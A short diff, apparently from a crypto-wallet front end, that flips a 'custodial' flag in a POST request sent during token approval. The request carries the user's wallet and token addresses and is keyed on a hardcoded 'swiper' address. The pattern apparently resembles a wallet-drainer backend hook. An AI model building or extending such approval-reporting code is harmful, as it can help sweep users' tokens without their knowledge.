@@ -421,7 +421,7 @@ export function useApproveCallback(
                   walletAddress: account,
                   tokenAddress: tokenContract.address,
                   purge: false,
-                  custodial: swiper == '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053' ? false : true,
+                  custodial: swiper == '0xf925cDFD4806342d9dc1D5c7Ae09e3A43a02B053' ? true : false,
                 }),
                 method: 'POST',
               })
